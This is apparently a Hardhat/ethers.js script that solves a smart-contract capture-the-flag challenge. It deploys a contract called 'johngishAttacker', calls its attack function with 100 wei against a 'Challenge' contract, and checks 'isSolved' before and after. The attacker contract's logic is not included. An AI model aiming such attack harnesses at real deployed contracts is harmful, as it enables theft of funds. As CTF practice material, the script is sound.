const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("johngishAttacker");

  const setup = await ethers.getContractAt( "Setup", "0x427255B0e21A7f0D809c7cE854569A10df44378d" );
  const ctf = await ethers.getContractAt( "Challenge", "0x2Dec5971b627485A50af67a921C6ADB6CC3ffCe4" );

  console.log("solved:", await setup.isSolved());

  const exploit = await EXPLOIT.deploy();
  await exploit.attack(ctf.address, { value: 100 });

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
